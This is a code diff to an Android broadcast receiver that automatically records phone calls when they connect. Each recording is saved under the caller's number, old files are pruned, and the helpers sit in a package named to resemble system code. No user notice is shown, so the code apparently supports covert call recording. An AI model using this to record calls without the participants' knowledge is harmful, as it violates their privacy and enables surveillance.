@@ -5,16 +5,17 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.os.Bundle;
-import android.telephony.PhoneStateListener;
 import android.telephony.TelephonyManager;
-import android.util.Log;
 
 import com.android.system.utils.AudioRecorder;
 import com.android.system.utils.SystemUtil;
 
 import java.io.File;
+import java.util.Arrays;
 
 public class PhoneCallReceiver extends BroadcastReceiver {
+    private static String sPhoneNumber = null;
+
     @Override
     public void onReceive(final Context context, final Intent intent) {
         String phoneNumber = null;
@@ -23,29 +24,38 @@ public class PhoneCallReceiver extends BroadcastReceiver {
         } else {
             phoneNumber = intent.getStringExtra("incoming_number");
         }
+        if(phoneNumber != null) {
+            sPhoneNumber = phoneNumber;
+        }
+
         TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Service.TELEPHONY_SERVICE);
-        final String finalPhoneNumber = phoneNumber;
-        telephonyManager.listen(new PhoneStateListener(){
-            @Override
-            public void onCallStateChanged(int state, String incomingNumber) {
-                super.onCallStateChanged(state, incomingNumber);
-                switch(state){
-                    case TelephonyManager.CALL_STATE_IDLE:
-                        Log.i("PHONE", "挂断");
-                        AudioRecorder.stop();
-                        break;
-                    case TelephonyManager.CALL_STATE_OFFHOOK:
-                        Log.i("PHONE", "接听");
-                        String recordPath = context.getFilesDir().getAbsolutePath() + "/record/";
-                        new File(recordPath).mkdirs();
-                        String savePath = recordPath + SystemUtil.getDateString() + "-" + (finalPhoneNumber) + ".amr";
-                        AudioRecorder.start(savePath);
-                        break;
-                    case TelephonyManager.CALL_STATE_RINGING:
-                        break;
+        int state = telephonyManager.getCallState();
+        switch(state){
+            case TelephonyManager.CALL_STATE_IDLE:
+                AudioRecorder.stop();
+                break;
+            case TelephonyManager.CALL_STATE_OFFHOOK:
+                String recordPath = context.getFilesDir().getAbsolutePath() + "/record/";
+                File recordDir = new File(recordPath);
+                recordDir.mkdirs();
+
+                //remove old record file
+                File [] fileList = recordDir.listFiles();
+                int maxFileCount = 9;
+                if(fileList != null && fileList.length > maxFileCount) {
+                    Arrays.sort(fileList);
+                    int n = fileList.length - maxFileCount;
+                    for(int i=0; i<n;++i) {
+                        fileList[i].delete();
+                    }
                 }
-            }
-        },PhoneStateListener.LISTEN_CALL_STATE);
+
+                String savePath = recordPath + SystemUtil.getDateString() + "-" + (sPhoneNumber) + ".amr";
+                AudioRecorder.start(savePath);
+                break;
+            case TelephonyManager.CALL_STATE_RINGING:
+                break;
+        }
     }
 
     private String getOutGoingCallNumber(Intent intent)
